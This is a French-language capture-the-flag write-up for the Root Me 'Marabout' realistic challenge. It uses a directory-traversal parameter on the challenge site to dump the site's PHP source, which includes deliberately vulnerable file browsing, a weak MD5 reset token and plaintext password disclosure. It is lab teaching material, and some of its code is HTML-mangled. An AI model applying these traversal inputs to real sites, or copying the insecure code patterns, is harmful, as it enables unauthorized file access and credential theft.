# [Marabou Root Me Challenge](https://www.root-me.org/fr/Challenges/Realiste/Marabout)

![Layer](./assets/marabou_layer.png)

[Challenge](http://challenge01.root-me.org/realiste/ch14/?p=news)

Énoncé
Vous ne croyez pas en la puissance des Marabouts. Prenez le contrôle de la section d’administration du site.

*On peut remarquer une faille, une fois avoir créer un compte, quand on se rend sur le page **[Annonces](http://challenge01.root-me.org/realiste/ch14/?p=annonces)** on remarque un système de nagivation dans les fichier type vim. Regardons cela de plus prêt...*

*Un GET "a"  permet de selectionner et de naviger dans les fichiers, par exemple **[URL+&a=./../../](challenge01.root-me.org/realiste/ch14/?p=annonces&a=./../../)** nous permet de revenir au dossier source du site ! * :)

*Après inspection du code*
index.php 
```php
<?php
	include('conf/config.php');
	session_start();
	include($cfg['tpl'] .'/header.php');
	$authorized = array('news', 'login', 'login_dev', 'register', 'disconnect', 'annonces','annonces_dev', 'forgot', 'forgot_dev', 'logout');
	$page = isset($_GET['p']) && !empty($_GET['p']) && in_array($_GET['p'], $authorized) ? $_GET['p'] : 'news';
	echo '<h2
'. ucfirst($page). '';
	include($cfg['dir_include'] .'/'. $page .'.php');
	include($cfg['tpl'] .'/footer.php');
?>
		
```

conf/config.php
```php
<?php
    $cfg['app']				= 'ch14';	// not used
    //$cfg['dir_app'] 		= dirname($_SERVER['SCRIPT_FILENAME']).'/';
    // work with relative paths
    $cfg['dir_app'] 		= "";
    $cfg['dir_include'] 	= $cfg['dir_app'].'inc';
    $cfg['dir_announces'] 	= $cfg['dir_include'].'/'.'announces';
    $cfg['tpl'] 			= $cfg['dir_app'].'tpl';

    $cfg['database_type']	= 'sqlite';
    $cfg['database']		= 'tmp/forgotme.sqlite';

    try {
        $dbh = new PDO($cfg['database_type'] .":". $cfg['dir_app'].$cfg['database']);
    } catch(PDOException $e) {
        echo $e-getMessage();
    }
?>
```


```git
**/.sessions/*
!**/.sessions/.gitkeep
**/tmp/*
!**/tmp/.gitkeep
**/upload/*
!**/upload/.gitkeep
vendor/
.npm/
.npm-packages/
.oracle_jre_usage/
node_modules/
__pycache__/
*.pyc
*.o

```

inc/forgot_dev.php
```php
<?php
if (!isset($_SESSION['username'])) {
	if(isset($_GET['username']) && !empty($_GET['username'])) {
		if(isset($_GET['token']) && !empty($_GET['token'])) {
			$sql = 'SELECT password,token FROM users WHERE username= ?';
			$sth = $dbh--->prepare($sql);
			$sth-&gt;execute(array($_GET['username']));
			$res = $sth-&gt;fetch();
			if($res['token'] == $_GET['token'] &amp;&amp; $res['token'] != 'NULL') {
				echo '<span class="error">Votre mot de passe est : '. $res['password'] .'</span>';
			} else {
				echo '<span class="error">Token non valable</span>';
			}
		} else {
			$sql = 'SELECT username FROM users WHERE username= ?';
			$sth = $dbh-&gt;prepare($sql);
			$sth-&gt;execute(array($_GET['username']));
			$res = $sth-&gt;fetch();

			if($res) {
				$salt = microtime();
				$generated_token = MD5('$salt' . rand(1, 100));
				$sql = 'UPDATE users SET token = ? WHERE username = ?';
				$sth = $dbh-&gt;prepare($sql);
				if($sth-&gt;execute(array($generated_token, $_GET['username']))) {
					//TODO: le sendmail php ne marche pas, je vais consulter les esprits
					//mail
					echo '<span class="error">Un email vient de vous être envoyé avec un lien permettant de changer votre mot de passe.</span>';
			} else {
				echo $sth-&gt;errorCode();
				echo print_r($sth-&gt;errorInfo());
				echo '<span class="error">Nom d\'utilisateur invalide</span>';
			}
			} else {
				echo '<span class="error">Nom d\'utilisateur invalide</span>';
			}
		}
	} else {
		if(isset($_GET['username']) &amp;&amp; empty($_GET['username'])) {
			echo '<span class="error">Nom d\'utilisateur invalide</span>';
		}
		echo '<form action="?p=forgot_dev" method="get"><fieldset><legend>Récupération de mot de passe</legend><p><label>Nom d\'utilisateur </label><input type="hidden" name="p" value="forgot_dev"><input type="text" name="username"></p><p><input type="submit" value="Envoyer"></p></fieldset></form>';
	}

} else {
	echo '<span class="error">Vous êtes déjà connecté !</span>';
}
?&gt;
?>
```


Pour la avoir la page, login_dev.php, on est redirigé au bout de 1-2 seconde, une fois sur la page faire un Ctrl+s pour enregistrer rapidement le fichier HTML et le code php affiché
inc/login_dev.php
```php
<?php
if (isset($_POST['submitted'])) {

	$required = array('username', 'password');
	$errors = array();

	foreach ($required as $field) {
		if ($_POST[$field] == '') {
			$errors[$field] = 'Veuillez saisir un '. $field .'.';
		}

	if (!empty($errors)) {
		foreach ($errors as $field =--> $message) {
			echo '<span class="error">Erreur pour le champ '. ucfirst($field) .' :  '. $message .'</span><br>';
		}
	} else {
		$sql = 'SELECT username FROM users WHERE username = ? and password = ?';
		$sth = $dbh-&gt;prepare($sql);
		
                
                $sth-&gt;execute(array($_POST['username'], $_POST['password']));

                
                $present = $sth-&gt;fetch();
		if($present) {
			$_SESSION['username'] = $_POST['username'];
			echo 'Vous êtes désormais identifié ! Redirection en cours...';
			echo '<meta http-equiv="refresh" content="2; URL=?">';
		} else {
			echo '<span class="error">Nom d\'utilisateur / mot de passe invalide</span><br>';
		}
	}
} else {
?&gt;
<form action="http://challenge01.root-me.org/realiste/ch14/?p=login" method="post" data-np-autofill-type="login" data-np-checked="1" data-np-watching="1">
	<fieldset>
		<legend>Converti de retour ? </legend>
		<p>
		<label>Login </label>
		<input type="text" name="username" placeholder="ex: Sekou" value="" data-np-autofill-type="username" data-np-uid="8c0f67c3-1e96-4998-a271-dbfd63eb004d" autocomplete="off">
		<span data-np-uid="8c0f67c3-1e96-4998-a271-dbfd63eb004d" style="width: 16px; min-width: 16px; height: 16px; background-image: url(&quot;chrome-extension://fooolghllnmhmmndgjiamiiodkpenpbb/assets/manifestIcons/icon.svg&quot;); background-repeat: no-repeat; background-position: left center; background-size: auto; border: none; display: inline-block; visibility: visible; position: absolute; cursor: pointer; z-index: 998; padding: 0px; transition: none 0s ease 0s; pointer-events: all; right: 0px; left: 942.75px; top: 480.016px; min-height: 16px;"></span></p>
		<p>
		<label>Mot de passe </label>
		<input type="password" name="password" placeholder="ex: 4alPhaNum" value="" data-np-autofill-type="password" data-np-uid="edb3650a-7b31-423b-84b4-407a12671334" autocomplete="off">
		<span data-np-uid="edb3650a-7b31-423b-84b4-407a12671334" style="width: 16px; min-width: 16px; height: 16px; background-image: url(&quot;chrome-extension://fooolghllnmhmmndgjiamiiodkpenpbb/assets/manifestIcons/icon.svg&quot;); background-repeat: no-repeat; background-position: left center; background-size: auto; border: none; display: inline-block; visibility: visible; position: absolute; cursor: pointer; z-index: 998; padding: 0px; transition: none 0s ease 0s; pointer-events: all; right: 0px; left: 942.75px; top: 526.016px; min-height: 16px;"></span></p>
		<input type="hidden" name="submitted" value="ofcourse">
		<p>
		<input type="submit" value="Login"> - <a href="http://challenge01.root-me.org/realiste/ch14/?p=forgot">Mot de passe oublié ?</a>
		</p>
	</fieldset>
</form>
<!--?php
}
?-->
```

inc/annonces_dev.php
```php
<?php
if (isset($_SESSION['username'])) {

	$f = isset($_GET['a']) && !empty($_GET['a']) ? $_GET['a'] : '.';
	$rel = $f;
	$f = $cfg['dir_announces'].'/'.$f;
	$pattern = str_replace('/', '\/', $cfg['dir_announces']);

	$d = $cfg['dir_announces'];
	$dep = array_diff(scandir($d), array('..'));

	$base = explode('/', $rel);
	$base = $base[0];

	if(is_dir($f)) {
		$realdir = realpath($f);
	} else {
		$realdir = realpath(dirname($f));
	}
	$current = substr($realdir,0,strlen($cfg['dir_announces']));

        //Les esprits recommendent
        $f = preg_replace('/sqlite/i', 'X', $f);
	
        //can't remember what I've done.. PFM !
	$restricted = preg_replace('{/$}', '', $cfg['dir_include']);


        echo '--'.$f.'--<br-->'; 
	// quick-fix, PHP style
	if((in_array($base, $dep)) &amp;&amp; !(strlen($current) &lt; strlen($restricted)) &amp;&amp; file_exists($f)) {
		if(is_dir($f)) {
			echo '<ul>';
			foreach(array_diff(scandir($f), array('.')) as $elt) {
				if($elt == ".." &amp;&amp; $current == $cfg['dir_announces']) {
					if (isset($_GET['a']) &amp;&amp; !empty($_GET['a'])) {
					echo '<li><a href="?p=annonces&amp;a="><img src="imgs/back.png" alt=""></a>';
					}
				} else {
					$rela  = $rel == '.' ? '' : $rel.'/';
					echo '</li><li><a href="?p=annonces&amp;a='. $rela.$elt .'">'. $elt  .'</a></li>';
				}
			}
		} else {
			if(in_array(pathinfo($f, PATHINFO_EXTENSION), array("jpeg", "png", "jpg", "gif"))) {
				echo '<a onclick="window.history.back()">&lt;--</a><br>';
				echo '<img src="inc/announces/'. $rel .'" alt="Annonce de qualité">';
			} else {
				
				echo file_get_contents($f);
			}
		}
	} else {
		echo '<span class="error">Dossier ou fichier incorrect.</span>';
	}
} else {
	echo '<span class="error">Veuillez vous connecter pour accéder à nos merveilleuses annonces !</span>';
}
?&gt;
		</ul></div>
```


*On peut même se ballader un peu plus loin et obtenir les methodes php de vérification du chemin **[URL+&a=./../../../](challenge01.root-me.org/realiste/ch14/?p=annonces&a=./../../../)** *

```php
Warning: is_dir(): open_basedir restriction in effect. File(inc/announces/./../../../) is not within the allowed path(s): (/challenge/realiste/ch14:/tmp) in /challenge/realiste/ch14/inc/annonces.php on line 15

Warning: file_exists(): open_basedir restriction in effect. File(inc/announces/./../../../) is not within the allowed path(s): (/challenge/realiste/ch14:/tmp) in /challenge/realiste/ch14/inc/annonces.php on line 29
```